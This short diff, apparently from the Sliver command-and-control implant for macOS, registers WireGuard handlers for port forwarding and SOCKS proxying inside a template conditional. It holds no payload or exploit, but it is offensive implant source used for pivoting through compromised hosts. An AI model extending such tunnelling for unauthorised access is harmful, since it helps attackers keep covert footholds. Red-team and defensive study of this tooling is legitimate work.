@@ -43,6 +43,16 @@ var (
 		pb.MsgScreenshotReq: screenshotHandler,
 
 		pb.MsgSideloadReq: sideloadHandler,
+
+		// {{if .Config.WGc2Enabled}}
+		// Wireguard specific
+		sliverpb.MsgWGStartPortFwdReq:   wgStartPortfwdHandler,
+		sliverpb.MsgWGStopPortFwdReq:    wgStopPortfwdHandler,
+		sliverpb.MsgWGListForwardersReq: wgListTCPForwardersHandler,
+		sliverpb.MsgWGStartSocksReq:     wgStartSocksHandler,
+		sliverpb.MsgWGStopSocksReq:      wgStopSocksHandler,
+		sliverpb.MsgWGListSocksReq:      wgListSocksServersHandler,
+		// {{end}}
 	}
 
 	darwinPivotHandlers = map[uint32]PivotHandler{}
